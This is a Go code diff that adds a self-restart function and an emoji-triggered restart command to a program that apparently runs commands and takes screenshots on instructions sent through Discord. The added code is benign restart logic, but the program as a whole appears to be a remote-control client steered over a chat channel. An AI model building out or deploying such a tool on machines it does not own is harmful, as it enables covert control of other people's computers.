@@ -10,6 +10,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"syscall"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/kbinani/screenshot"
@@ -78,6 +79,26 @@ func runCommandString(s *discordgo.Session, channelID string, ref *discordgo.Mes
 			}
 		}
 	}
+}
+
+func restartClient() error {
+	exe, err := os.Executable()
+	if err != nil {
+		return err
+	}
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command(exe, os.Args[1:]...)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		cmd.Stdin = os.Stdin
+		err := cmd.Start()
+		if err != nil {
+			return err
+		}
+		os.Exit(0)
+		return nil
+	}
+	return syscall.Exec(exe, os.Args, os.Environ())
 }
 
 func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
@@ -235,6 +256,12 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 					flag = 1
 				}
 			}
+		}
+	} else if m.Content == "🔁" {
+		s.ChannelMessageSendReply(m.ChannelID, "🔁 Restarting client...", m.Reference())
+		err := restartClient()
+		if err != nil {
+			s.ChannelMessageSendReply(m.ChannelID, "Restart failed: "+err.Error(), m.Reference())
 		}
 	} else if m.Content == "💀" {
 		flag = 2
